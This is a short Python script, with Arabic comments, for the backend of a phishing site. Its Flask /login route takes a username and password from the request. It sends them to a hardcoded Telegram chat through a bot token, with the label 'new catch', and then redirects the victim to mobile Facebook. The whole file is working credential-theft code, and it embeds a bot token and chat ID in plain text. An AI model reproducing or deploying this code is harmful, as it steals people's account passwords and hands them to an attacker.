import telebot
from flask import Flask, request, redirect
from threading import Thread

# --- إعدادات Saber الشخصية ---
TOKEN = '8558994517:AAGTSRb6yTo4icoclVajC6RYLU09vjc-LTY'
ID = '7716781815'

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Server Active"

@app.route('/login')
def login():
    u = request.args.get('u')
    p = request.args.get('p')
    if u and p:
        bot.send_message(ID, f"🎯 صيد جديد!\n👤 الحساب: {u}\n🔑 الباسورد: {p}")
    return redirect("https://m.facebook.com")

def run():
    app.run(host='0.0.0.0', port=10000)

if __name__ == "__main__":
    t = Thread(target=run)
    t.start()
